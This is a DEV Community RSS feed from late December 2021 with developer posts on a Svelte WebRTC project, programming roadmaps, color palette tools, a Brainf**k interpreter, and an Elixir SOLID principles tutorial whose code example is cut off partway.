<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>Using WebRTC and Svelte</title>
      <author>Brian</author>
      <pubDate>Sun, 26 Dec 2021 01:13:51 +0000</pubDate>
      <link>https://dev.to/yaku/using-webrtc-and-svelte-3pn</link>
      <guid>https://dev.to/yaku/using-webrtc-and-svelte-3pn</guid>
      <description>&lt;p&gt;Hello everyone kindly check out this &lt;a href="https://github.com/Yakumwamba/google_webrtc"&gt;github &lt;/a&gt; repo which hosts the code for my tutorial on how to use Svelte and Google's WebRTC.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;What is WebRTC?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;WebRTC is a protocol used for having real time communications in the web. With WebRTC, you can add real-time communication capabilities to your application that works on top of an open standard. It supports video, voice, and generic data to be sent between peers, allowing developers to build powerful voice- and video-communication solutions. The technology is available on all modern browsers as well as on native clients for all major platforms. The technologies behind WebRTC are implemented as an open web standard and available as regular JavaScript APIs in all major browsers. For native clients, like Android and iOS applications, a library is available that provides the same functionality. The WebRTC project is open-source and supported by Apple, Google, Microsoft and Mozilla, amongst others. This page is maintained by the Google WebRTC team.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Why I am doing this project?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I feel like svelte is new and has come with some solutions to some of the pain points in today's front end frameworks like react.js and vue.js, and I felt inspired to implement a webRTC application using Svelte only.&lt;/p&gt;

&lt;p&gt;If you like WebRTC and would like to learn more about or you want to support me with some code, here is the repo &lt;br&gt;
&lt;a href="https://github.com/Yakumwamba/google_webrtc"&gt;&lt;/a&gt;. &lt;/p&gt;

&lt;p&gt;This repo includes all the tutorials that are on &lt;a href="https://webrtc.github.io/samples/"&gt;https://webrtc.github.io/samples/&lt;/a&gt;. The aim of the project is to convert all the sample code to a Svelte app.&lt;/p&gt;

&lt;p&gt;Please kindly star the project and also follow the account.&lt;br&gt;
Thanks, Your support really means a lot to me :) &lt;/p&gt;

</description>
      <category>svelte</category>
      <category>webdev</category>
      <category>javascript</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>Complete Roadmap 2022🔥🔥</title>
      <author>Ashish Yadav</author>
      <pubDate>Sun, 26 Dec 2021 00:40:49 +0000</pubDate>
      <link>https://dev.to/expoashish/complete-roadmap-2022-11gk</link>
      <guid>https://dev.to/expoashish/complete-roadmap-2022-11gk</guid>
      <description>&lt;p&gt;In this blog we are going to see complete Roadmap for Python programming, Machine Learning, C++ and Java. Guys I will mention only topics in roadmap, Not describing Complete topics in my Post. If you like my post then follow me. Lets Start:-&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#complete-roadmap-2022"&gt;
  &lt;/a&gt;
  Complete Roadmap 2022:-
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://codexashish.blogspot.com/2021/12/complete-roadmap-of-python-programming.html"&gt;Python Complete Roadmap 2022&lt;/a&gt;&lt;br&gt;
&lt;a href="https://codexashish.blogspot.com/2021/12/complete-roadmap-of-machine-learning.html"&gt;Machine Learning Complete Roadmap 2022&lt;/a&gt;&lt;br&gt;
&lt;a href="https://codexashish.blogspot.com/2021/12/complete-roadmap-of-c-programming.html"&gt;C++ Complete Roadmap 2022&lt;/a&gt;&lt;br&gt;
&lt;a href="https://codexashish.blogspot.com/2021/12/java-complete-roadmap-2022.html"&gt;Java Complete Roadmap 2022&lt;/a&gt;&lt;br&gt;
&lt;a href="https://codexashish.blogspot.com/2021/12/complete-roadmap-of-data-structure.html"&gt;Data Structure Complete Roadmap 2022&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#some-laravel-tutorial-for-developer"&gt;
  &lt;/a&gt;
  Some Laravel Tutorial for developer:
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://codexashish.blogspot.com/2021/12/laravel-8-interview-questions-and.html"&gt;Laravel 8 Interview Questions and Answers in 2022 (Part #1)&lt;/a&gt;&lt;br&gt;
&lt;a href="https://codexashish.blogspot.com/2021/12/laravel-8-interview-questions-and_22.html"&gt;Laravel 8 Interview Questions and Answers in 2022 (Part #2)&lt;/a&gt;&lt;br&gt;
&lt;a href="https://codexashish.blogspot.com/2021/12/advance-laravel-8-interview-questions.html"&gt;Advance Laravel 8 Interview Questions and Answers 2022&lt;/a&gt;&lt;br&gt;
&lt;a href="https://codexashish.blogspot.com/2021/12/everything-about-laravel-8-composer.html"&gt;Everything About Laravel 8 Composer 2022 | Composer in Laravel 8&lt;/a&gt;&lt;br&gt;
&lt;a href="https://codexashish.blogspot.com/2021/12/laravel-jetstream-vs-laravel-ui-vs.html"&gt;Laravel Jetstream vs Laravel ui  vs Breeze&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#python-concept-and-projects"&gt;
  &lt;/a&gt;
  Python Concept and Projects:-
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://codexashish.blogspot.com/2021/12/10-best-python-libraries-for-machine.html"&gt;10 Best Python Libraries For Machine Learning&lt;/a&gt;&lt;br&gt;
&lt;a href="https://codexashish.blogspot.com/2021/07/alarm-clock-in-python-with-gui.html"&gt;Alarm Clock in Python with GUI&lt;/a&gt;&lt;br&gt;
&lt;a href="https://codexashish.blogspot.com/2021/06/tic-tac-toe-game-using-pygame-in-python.html"&gt;Tic Tac Toe Game Using Pygame in Python&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Thankyou for reading my blogs.&lt;/strong&gt;&lt;/p&gt;

&lt;h5&gt;
  &lt;a href="#my-website"&gt;
  &lt;/a&gt;
  My Website:
&lt;/h5&gt;

&lt;p&gt;&lt;a href="https://codexashish.blogspot.com/"&gt;CodexAshish&lt;/a&gt;&lt;/p&gt;

</description>
      <category>python</category>
      <category>machinelearning</category>
      <category>java</category>
      <category>cpp</category>
    </item>
    <item>
      <title>Find The Perfect Color Palette Using These Free Tools.</title>
      <author>Cess</author>
      <pubDate>Sun, 26 Dec 2021 00:29:37 +0000</pubDate>
      <link>https://dev.to/cesscode/find-the-perfect-color-palette-using-these-free-tools-28dk</link>
      <guid>https://dev.to/cesscode/find-the-perfect-color-palette-using-these-free-tools-28dk</guid>
      <description>&lt;p&gt;People who know about CSS or use CSS for a web developer know about the importance of color in CSS. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Color&lt;/strong&gt; is a crucial part of CSS, and you'll need to understand it to use it on your website.&lt;/p&gt;

&lt;p&gt;Choosing the right color is crucial if you want your website to look professional. But it's not easy to get it right. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;CSS color generators&lt;/strong&gt; are a great way to get the color you want for your website.&lt;/p&gt;

&lt;p&gt;In this article, I will talk about CSS color palette generators. &lt;/p&gt;

&lt;p&gt;let's get started 💃&lt;/p&gt;


&lt;p&gt;&lt;a href="https://giphy.com/gifs/ecardmint-christmas-xmas-happy-holidays-KH2XDzJDwEWDch2ycg"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-are-color-palette-generators"&gt;
  &lt;/a&gt;
  What are Color palette generators?
&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;A color palette generator is an online tool that will generate a random color palette or allow users to generate a selection of colors that go well with a specified shade. &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;There are five main types of color palettes:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Monochromatic: Single color or a variety of tints of the same color. You create monochromatic colors using shades/tints of the same color.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Analogous: On the color wheel, analogous colors are adjacent. It means they are next to each other on the color wheel.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Complementary: The complementary color is like the analogous color palette generator. They are opposite each other on the color wheel. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Split complementary: &lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;p&gt;Three colors make up the split complementary. A split complementary scheme involves the use of three colors. Start with one color, find its complement, and then use the two colors on either side of it.  For example, the complement of blue-green is red-orange and the split complement of blue-green would be red and orange. Again, any shade, tint, or tone of these three colors can be used when developing your color scheme. &lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;Triadic: Three colors make up a triadic color. These color palettes work best in projects that need a lot of contrast. They are at the same distance in a color wheel. &lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#what-are-the-benefits-of-using-a-color-palette-maker"&gt;
  &lt;/a&gt;
  What are the Benefits of Using a Color Palette Maker?
&lt;/h2&gt;

&lt;p&gt;Some of the importance of using color palette generators are:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;It provides the appropriate color scheme.&lt;/li&gt;
&lt;li&gt;It is easier to use than using one's hands to calculate the right colors for use every time.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#here-are-some-of-the-color-palette-generators-that-will-make-your-life-easier-as-a-designer"&gt;
  &lt;/a&gt;
  Here are some of the color palette generators that will make your life easier as a designer:
&lt;/h3&gt;

&lt;p&gt;1.&lt;br&gt;
&lt;strong&gt;Coolors&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This is the perfect website for any web designer. It is a super fast color scheme generator.  It helps you generate and collect beautiful palettes on the go.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ol3U9tLb--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1639608936959/MNoBXbsTL.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ol3U9tLb--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1639608936959/MNoBXbsTL.png" alt="frame_chrome_mac_dark.png" width="880" height="531"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://coolors.co/"&gt;Click on this link to visit the website&lt;/a&gt; &lt;/p&gt;

&lt;p&gt;2.&lt;br&gt;
&lt;strong&gt;Color Mind&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Colormind is a color scheme generator that uses deep learning. It can learn color styles from photographs, movies, and popular art.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--BBBepG2F--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1640407245415/0ZCxVkLp_.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--BBBepG2F--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1640407245415/0ZCxVkLp_.png" alt="frame_chrome_mac_dark (2).png" width="880" height="531"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="http://colormind.io/"&gt;Click on this link to visit the website&lt;/a&gt;  &lt;/p&gt;

&lt;p&gt;3.&lt;br&gt;
&lt;strong&gt;Paletton&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Paletton uses color to create a color scheme. It has plenty of previews and simulations to accommodate different scenarios for palette usage. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ku3oRvyn--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1639610870766/2xWGczxcm.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ku3oRvyn--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1639610870766/2xWGczxcm.png" alt="frame_chrome_mac_dark (4).png" width="880" height="531"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.paletton.com"&gt;Click on this link to visit the website&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;4.&lt;br&gt;
&lt;strong&gt;Color Hunt&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This is a color Palettes for Designers and Artists. It contains the newest hand-picked palettes of colors.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ksXQIRnc--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1639610312366/RigISw74py.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ksXQIRnc--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1639610312366/RigISw74py.png" alt="frame_chrome_mac_dark (2).png" width="880" height="531"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://colorhunt.co/"&gt;Click on this link to visit the website&lt;/a&gt; &lt;/p&gt;

&lt;p&gt;5.&lt;br&gt;
&lt;strong&gt;Color Inspo&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Color Inspo contains the latest color palettes. It contains thousands of beautiful color palettes you can use by clicking on them.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--MfKgMjFO--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1639610427333/nUFeJuAPl.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--MfKgMjFO--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1639610427333/nUFeJuAPl.png" alt="frame_chrome_mac_dark (3).png" width="880" height="531"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://colorsinspo.com/"&gt;Click on this link to visit the website&lt;/a&gt; &lt;/p&gt;

&lt;p&gt;6.&lt;br&gt;
&lt;strong&gt;Pigment&lt;/strong&gt;  &lt;/p&gt;

&lt;p&gt;A unique way to generate fresh and vibrant colors based on lighting and pigment, instead of math. Find a beautiful, free color palette in seconds to kick off your next project. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--h_Vp3A_k--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1639611232810/hUtffGcQo.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--h_Vp3A_k--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1639611232810/hUtffGcQo.png" alt="frame_chrome_mac_dark (8).png" width="880" height="496"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://pigment.shapefactory.co/"&gt;Click on this link to visit the website&lt;/a&gt;  &lt;/p&gt;

&lt;p&gt;7.&lt;br&gt;
&lt;strong&gt;Adobe Color CC&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Adobe color creates color schemes with the color wheel. Browse thousands of color combinations from the Kuler community. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--I3E50QnP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1640406596166/z2YQEp5Et.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--I3E50QnP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1640406596166/z2YQEp5Et.png" alt="frame_chrome_mac_dark (1).png" width="880" height="531"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://color.adobe.com/create/color-wheel"&gt;Click on this link to visit the website&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;8.&lt;br&gt;
&lt;strong&gt;Curls&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Curls contain colors that work together and are fashioned into quality palettes.  It makes it easier for you to find the right color combinations.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--MvHr5XhN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1640473918317/c5RvQGGH9.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--MvHr5XhN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1640473918317/c5RvQGGH9.png" alt="frame_chrome_mac_dark (3).png" width="880" height="531"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.culrs.com/#/"&gt;Click on this link to visit the website&lt;/a&gt;  &lt;/p&gt;

&lt;p&gt;9.&lt;br&gt;
&lt;strong&gt;Material UI Colors&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Color palette generator for Material Design. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--37KRXiu2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1640474828434/Uz90ZBlEV.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--37KRXiu2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1640474828434/Uz90ZBlEV.png" alt="frame_chrome_mac_dark (4).png" width="880" height="531"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://materialuicolors.co/"&gt;Click on this link to visit the website&lt;/a&gt; &lt;/p&gt;

&lt;p&gt;10.&lt;br&gt;
&lt;strong&gt;Html Color Codes&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Easily find HTML color codes for your website using our color picker, color chart, and HTML color names with Hex color codes, RGB, and HSL values. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--VDSCFiOP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1639611110005/eXzrKORXu.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--VDSCFiOP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1639611110005/eXzrKORXu.png" alt="frame_chrome_mac_dark (6).png" width="880" height="496"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://htmlcolorcodes.com/"&gt;Click on this link to visit the website&lt;/a&gt;  &lt;/p&gt;

&lt;p&gt;11.&lt;br&gt;
&lt;strong&gt;Color Space&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;With color space, you won't have to waste hours on finding the perfect color palette again! All you have to do is enter color and generate a nice color palette. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--OHh1Ogem--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1639610976862/LjwylyEO7.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--OHh1Ogem--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1639610976862/LjwylyEO7.png" alt="frame_chrome_mac_dark (5).png" width="880" height="496"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://mycolor.space/"&gt;Click on this link to visit the website&lt;/a&gt;  &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;Thank you for reading, hope you enjoyed the article! If you have any questions or feedback for me, please leave them below, I'll attend to them shortly.&lt;/p&gt;

&lt;p&gt;If you found this article helpful, please like and share it 💙.&lt;/p&gt;

&lt;p&gt;That's all for today! 😁 You reached the end of the article 😍.&lt;/p&gt;


&lt;p&gt;&lt;a href="https://giphy.com/gifs/filmeditor-christmas-movies-l2YWhBVVN43N2yqAM"&gt;&lt;/a&gt;&lt;/p&gt;

</description>
      <category>webdev</category>
      <category>javascript</category>
      <category>css</category>
      <category>codenewbie</category>
    </item>
    <item>
      <title>The Brain**** interpreter I made is on Sololearn.</title>
      <author>Calin Baenen</author>
      <pubDate>Sat, 25 Dec 2021 23:24:32 +0000</pubDate>
      <link>https://dev.to/baenencalin/the-brain-interpreter-i-made-is-on-sololearn-15of</link>
      <guid>https://dev.to/baenencalin/the-brain-interpreter-i-made-is-on-sololearn-15of</guid>
      <description>&lt;p&gt;The Brain**** interpreter I made in my other post, &lt;a href="https://dev.to/baenencalin/how-to-make-a-simple-brainfk-interpreter-using-parsejs-cw-light-profanity-45ea"&gt;"How to make a simple Brainf**k interpreter using ParseJS. [CW: Light 'profanity'.]"&lt;/a&gt;, is now on &lt;a href="https://www.sololearn.com/"&gt;SoloLearn&lt;/a&gt; for anyone and everyone to play around with. Even on mobile!&lt;/p&gt;

&lt;p&gt;Here's the URL: &lt;a href="https://code.sololearn.com/WMO3B752fdOj"&gt;https://code.sololearn.com/WMO3B752fdOj&lt;/a&gt;.&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>webdev</category>
      <category>watercooler</category>
      <category>sololearn</category>
    </item>
    <item>
      <title>Elixir SOLID Principles - Examples</title>
      <author>Luan Gomes</author>
      <pubDate>Sat, 25 Dec 2021 23:11:36 +0000</pubDate>
      <link>https://dev.to/lgdev07/elixir-solid-principles-examples-2db5</link>
      <guid>https://dev.to/lgdev07/elixir-solid-principles-examples-2db5</guid>
      <description>&lt;p&gt;Building an application can be hard depending on how you do it, as our career passes and the knowledge we get, more information and good practices we use for creating and improving the software we maintain.&lt;/p&gt;

&lt;p&gt;Some good practices are in SOLID Principles, a &lt;a href="https://en.wikipedia.org/wiki/Mnemonic"&gt;mnemonic&lt;/a&gt; &lt;a href="https://en.wikipedia.org/wiki/Acronym"&gt;acronym&lt;/a&gt; for five design principles intended to make software designs more understandable, flexible, and &lt;a href="https://en.wikipedia.org/wiki/Software_maintenance"&gt;maintainable&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Is good to be clear, SOLID has been created with Object-Oriented Programming in mind, so we are adapting to Elixir, a functional programming language, we are going to see that the benefits do not depend on the programming paradigm.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--dR63SRVv--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tiukvqng5ei7yrf4pxse.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--dR63SRVv--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tiukvqng5ei7yrf4pxse.png" alt="Solid" width="571" height="382"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#example-animals-module"&gt;
  &lt;/a&gt;
  Example - Animals module
&lt;/h2&gt;

&lt;p&gt;To explain better how we use the solid principles on elixir, I am gonna create a module and for each principle, we refactor it, the module is called Animals and is responsible to create an animal, adding some customization, getting and sending a picture of it.&lt;/p&gt;

&lt;p&gt;The example below is the first version:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight elixir"&gt;&lt;code&gt;&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;create_mammal&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#create an animal of type mammal&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;create_carnivorous&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#create an animal of type carnivorous&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;add_hat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#add a hat to the animal&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;add_shirt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#add a hat to the animal&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;get_picture&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#get picture from the animal&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;send_picture_email&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;picture&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#send the picture to email&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;send_picture_whatsapp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;picture&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;number&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#send the picture to whatsapp&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_mammal&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;animal_customized&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;animal&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_hat&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_shirt&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
